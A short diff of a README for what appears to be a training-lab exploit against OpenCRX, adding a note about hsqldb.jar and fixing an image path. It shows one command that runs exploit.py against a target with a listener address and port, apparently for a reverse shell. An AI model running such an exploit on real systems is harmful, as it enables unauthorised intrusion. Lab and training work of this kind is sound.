@@ -7,9 +7,10 @@ pip install jaydebeapi
 
 Then, you can run the exploit
 ```bash
+# You need to run the script where hsqldb.jar is located (this directory)
 python3 exploit.py -t https://opencrx:8000 -l 192.168.45.243 -p 4444
 ```
-![OpenCRX](/.images/apigateway.png)
+![OpenCRX](/.images/opencrx.png)
 
 > [!WARNING]
 > Remember to start the lab before running the exploit:
